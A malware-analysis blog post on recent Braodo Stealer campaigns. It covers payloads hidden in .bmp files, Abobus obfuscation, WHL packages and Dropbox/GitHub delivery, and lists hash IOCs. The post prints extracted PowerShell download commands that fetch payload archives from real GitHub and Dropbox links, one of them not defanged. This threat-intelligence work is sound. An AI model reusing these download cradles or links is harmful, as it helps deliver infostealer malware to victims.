---
title:  "Fresh Infections Of Braodo Stealer With Updated Techniques"
layout: post
categories: malware-analysis
---

## Contents

- Background.
- Technical Analysis.
    - Abusing .bmp file format.
    - Encoding and Obfuscation.
    - Abusing Dropbox services.
    - Abusing WHL packages. 
- IOCs.
- Conclusion.

## Background


Hi readers, hope you enjoyed my last blog on Braodo Stealer, as a newbie and as I'm just getting started I have decided to track the same, so recently I found that Braodo Stealer is back with a bunch of changes on their arsenal , which includes adding Base64 encoding along with renaming variable names and then abusing an open source obfuscator known as Abobas-Obfuscator. Well, the last but not the least that's using different file formats like .bmp and abusing Dropbox services for payload delivery.

## Technical Analysis.

In this phase, we will know different methods that this stealer uses to download the payload from various sources and executes the malicious python file. 


### Abusing .bmp file format.

One of the recent developments of Braodo Stealer's arsenal has been abusing bmp format for initial infections.

![image](https://github.com/user-attachments/assets/eb044983-e72d-46d3-a6a1-2701f87ea7f7)


So, we can see that there is encoded garbage blob present inside the bmp payload and the actual script which is responsible for downloading the final payload from Github which is exactly the same just like the previous campaigns with just different Github accounts downloading the final Python script.

### Encoding and obfuscation.

Another interesting development among the stealer arsenal is it has been using an open source obfuscator,known as [Abobus obfuscator](https://github.com/EscaLag/Abobus-obfuscator/blob/main/AbobusObf.py) as we found the name of the obfuscator as it is present in one of the sample with the name of the author.

![image](https://github.com/user-attachments/assets/0d2dae90-19d0-4d1d-b143-6ae11d6843ee)

The way this obfuscator works is by adding garbage values to the batch script then performing character encoding and by changing the cases of the alphabets in a random manner and many such pseduo obfuscation techniques . The way the sample deobfuscates and runs in memory is by initially changing the code page by using `chcp` windows utility and chnaging the code page to English which further faciliates the execution of the malicious batch script which then downloads the ZIP payload. As this is an open source obfuscator it was quite easy to understand and perform the deobfuscation.

The extracted config is as follows:

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("hxxps://github.com/LoneNone1807/abcxyz/raw/main/abcxyz.zip", "C:\\Users\\Public\\25350.zip")

```
 
### Abusing Dropbox services.

As we know that the primary technique of Braodo stealer is to store the final payload over Github, but recently in one of the campaigns which was obfuscated with Abobus obfuscator was dropping a document as a lure . The document was mainly focused on online marketing of shoes and similar marketing gimmicks were present. 


![image](https://github.com/user-attachments/assets/7a8ed849-736e-4b87-92aa-3f92b0f4ca36)

So , once the lure was popped up on the screen, I de-obfuscated and found out that this campaign is using Dropbox services to download the payload and also adding a registry key as persistance. The extracted configs are as follows:

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("hxxps://www.dropbox.com/scl/fi/mkx2tii0ud0i6ugpbbjh6/Product_Marketing_and_Brand_Marketing_Campaigns0909.docx?rlkey=4gqc2cpjo6kp5iltdjevlbxzv&st=50y5pfp4&dl=1", "C:\\Users\\Admin\\AppData\\Local\\Temp\\\\Product_Marketing_and_Brand_Marketing_Campaigns0909.docx")
```

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("https://www.dropbox.com/scl/fi/0qh04if44j5q056ehruij/tn0909.zip?rlkey=f9zmunjbhjdmsuh7by9bp4wf1&st=ffsvc7c8&dl=1", "C:\\Users\\Public\\Document.zip")
```

### Abusing whl package

![image](https://github.com/user-attachments/assets/e1053b08-c546-4960-acd8-8b35cfb6c815)

![image](https://github.com/user-attachments/assets/3a0e9466-56f0-407a-b11f-3ae40bd1ac5c)

Recently I found out that instead of delivering obfuscated batch files in a fresh campaign , the braodo stealer guys have started to deliver python whl packages which upon execution downloads the files from Github which involves the batch script masquareded in form of bmp file format and the ZIP file containing the actual malicious python file. 

![image](https://github.com/user-attachments/assets/8c501e69-4cb2-4954-846e-30b772ea0431)

so then I went ahead and downloaded the payloads. 

![image](https://github.com/user-attachments/assets/13fa8e80-c476-4451-94c0-8c329b2fec99)

![image](https://github.com/user-attachments/assets/a7fd4cb2-20c7-4ff7-b8e6-bdfa427ee0f4)

Once again it turns out that it is abusing bmp file format which has a batch script inside it which runs the `sim.py` file which is actually the infostealer.

## IOCs.

- e314fc6308c31b600eb43fee5e4716034375f0a7e6916326c605ec955ead5757
- dba09794ee80639df8633b23219d29976bd7fabcb60db063023f3ba8f9cc1c9b
- a93d56fde501f5341c1c84e5a1f2f17253bbcada088898b2cb3df35c9ff68b93
- 4d7892ce5812d01041cdeff95bc622dda3f6bb3add64045eb15ce73215080b52
- 1393332ec07088ea36ad7002528a5e80a16615e92898a56f2e427c004f718bcb



## Conclusion.

Thanks everyone for reading the blog up to here, thanks to Yogesh for helping me to track improvements in Braodo stealer's arsenal . This was one of a very brief attempt on understanding the changes. Please do let me know if you find any issues or feedback regarding the blog. 



